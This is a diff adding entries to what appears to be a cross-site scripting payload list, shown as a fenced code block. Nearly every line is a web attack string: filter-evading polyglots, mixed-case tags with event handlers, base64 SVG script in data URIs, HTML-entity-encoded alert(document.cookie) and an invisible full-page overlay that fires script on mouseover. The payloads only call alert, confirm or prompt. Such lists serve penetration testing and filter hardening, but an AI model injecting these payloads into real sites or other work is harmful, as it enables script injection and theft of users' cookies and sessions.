@@ -3,9 +3,16 @@
 &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
 <a href="jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=confirm()//&gt;\x3e">click me</a>
 <a href="javascript&colon;alert&lpar;document&period;cookie&rpar;">REDIRECT TO LOGIN</a>
+<bOdY onload=confirm()>
+<bOdY onpageshow=confirm()>
+<dEtaiLs open ontoggle="confirm()">
 <dIV>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm()//>\x3e</dIV>
+<dIV style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="confirm()"></div>
+<eMbEd src="data:image/sVg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+Y29uZmlybSgpOzwvc2NyaXB0Pjwvc3ZnPg=="></eMbEd>
 <iFraMe/src="data:text/html,<sVg onload=confirm(1)>">
+<iFraMe srcdoc="<sVg onload=confirm();>">
 <iFraMe src="jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=confirm()//&gt;\x3e"></iFraMe>
+<iFraMe src=javascript:confirm()>
 <iFraMe src=""/srcdoc='<sVg onload=confirm(1)>'>
 <iMG border=3 alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=confirm()//&gt;\x3e>
 <iMG/id="confirm('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
@@ -19,6 +26,7 @@
 <iMG src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
 <iNpUt %253e onfocus="&#x000000000000000000000000000000061;lert()" autofocus />
 <iNpUt /&#62; id=""onfocus="window['\a\l\ert']()" autofocus/>
+<iNpUt autofocus="" onfocus=confirm()></iNpUt>
 <iNpUt &gt; id="x"onfocus="window['\a\l\ert']()" autofocus />
 <iNpUt type=image src onerror="prompt(1)">
 <iNpUt type=im&#x000000000000000000000000000000061;ge &gt; id="x"oNerRor="window['\a\l\ert']()" src />
@@ -31,6 +39,8 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0A%0a*/(/* */oNcliCk=confirm() )//</stYle/</titLe/
 //jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm()//>\x3e
 <!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm()//>\x3e-->
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm()//>\x3e
+"'--></nosCript></nOEMbed></tempLAte></TiTle></textareA></style><sCriPt>confirm()</sCriPt>
+<ObjecT data="data:text/html,<sCriPt>confirm()</sCriPt>">
 <oBjECt data="javascript:window['\a\l\ert']()" />
 <sCriPt>$=1,confirm($)</sCriPt>
 <sCriPt>$=1,\u0061lert($)</sCriPt>
@@ -54,13 +64,18 @@ String.raw`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0
 <sVg id=x;onload=confirm(1)>
 <sVg onload=confirm(1)//
 <sVg////////onload=confirm(1)>
+<sVg    onload=confirm()><sVg>
+<sVg/onload=confirm()><sVg>
+<sVg␌onload=confirm()><sVg>
 <sVg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
 <sVg onload="void 'javascript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=confirm()//&gt;\x3e';"></sVg>
 <sVg><x><sCriPt>confirm('1'&#41</x>
 <teXTaRea>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm()//>\x3e</teXTaRea>
 <tiTLe>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm()//>\x3e</tiTLe>
+'"--></title></textarea></style></noscript></noembed></template></frameset><sVg onload=confirm()>
 var re=/jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm()//>\x3e/;
 var str="jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm()//>\x3e";
+<vIDeo controls onloadstart="confirm()"><source src=x></vIDeo>
 &#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
 ```
 
